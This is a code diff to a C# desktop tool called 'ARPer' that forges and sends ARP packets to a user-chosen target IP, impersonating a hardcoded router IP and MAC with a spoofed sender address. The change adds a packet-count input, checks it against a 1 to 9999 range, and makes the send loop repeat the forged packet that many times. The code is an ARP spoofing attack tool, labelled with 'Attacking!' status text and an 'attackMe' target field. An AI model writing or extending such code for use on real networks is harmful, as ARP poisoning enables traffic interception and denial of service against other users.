@@ -56,7 +56,7 @@ namespace ARPer
 
         private void button_Click(object sender, RoutedEventArgs e)
         {
-            progress.Text = "Attacking!";
+            progress.Text = "Validating...";
             if (isIpValid(attackMe.Text))
             {
                 string mac = ""; //TODO: make this customizable
@@ -72,6 +72,13 @@ namespace ARPer
                     //this better work
                     mac = "C8:3A:35:07:41:68";
                     ip = "192.168.0.1";
+                }
+                int numPacks = Convert.ToInt32(numPackets.Text);
+                if (!((numPacks > 0) && (numPacks < 10000)))
+                {
+                    numPackets.Focus();
+                    numPackets.SelectAll();
+                    return;
                 }
                 BackgroundWorker bg = new BackgroundWorker();
                 bg.WorkerReportsProgress = true;
@@ -103,6 +110,8 @@ namespace ARPer
                 arguments.Add(attackMe.Text);
                 arguments.Add(mac);
                 arguments.Add(ip);
+                arguments.Add(numPacks);
+                progress.Text = "Attacking!";
                 bg.RunWorkerAsync(arguments);
                 //sendArp(attackMe.Text, mac, ip); 
             }
@@ -138,12 +147,13 @@ namespace ARPer
             return true;
         }
 
-        private void sendArp(object sender, DoWorkEventArgs e) //string attackIP, string routerMAC, string routerIP)
+        private void sendArp(object sender, DoWorkEventArgs e) 
         {
             List<object> genericlist = e.Argument as List<object>;
             string attackIP = genericlist[0].ToString();
             string routerMAC = genericlist[1].ToString();
             string routerIP = genericlist[2].ToString();
+            int reps = Convert.ToInt32(genericlist[3]);
             string myMAC = "A0:A8:CD:9A:CB:AD";
             string arpSenderMAC = "0A:5A:7B:30:3F:71";
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
@@ -183,7 +193,7 @@ namespace ARPer
                 };
                 PacketBuilder builder = new PacketBuilder(ethLayer, arpLayer);
                 Packet packet = builder.Build(DateTime.Now);
-                for (int i = 0; i < 1; i++)
+                for (int i = 0; i < reps; i++)
                 {
                     communicator.SendPacket(packet);
                 }
